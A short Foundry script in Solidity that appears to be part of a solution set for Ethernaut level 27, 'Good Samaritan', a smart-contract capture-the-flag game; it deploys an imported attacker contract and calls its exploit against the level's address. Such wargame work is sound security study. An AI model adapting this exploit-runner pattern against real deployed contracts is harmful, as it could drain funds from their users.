// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { GoodSamaritanAttacker } from "ethernaut/27-good-samaritan/GoodSamaritanAttacker.sol";

contract GoodSamaritanScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address goodSamaritanAddr = vm.envAddress("L27_GOOD_SAMARITAN_ADDRESS");

        // Step 1: deploy attacker and exploit
        GoodSamaritanAttacker goodSamaritanAttacker = new GoodSamaritanAttacker();
        goodSamaritanAttacker.exploit(goodSamaritanAddr, 10);

        vm.stopBroadcast();
    }
}
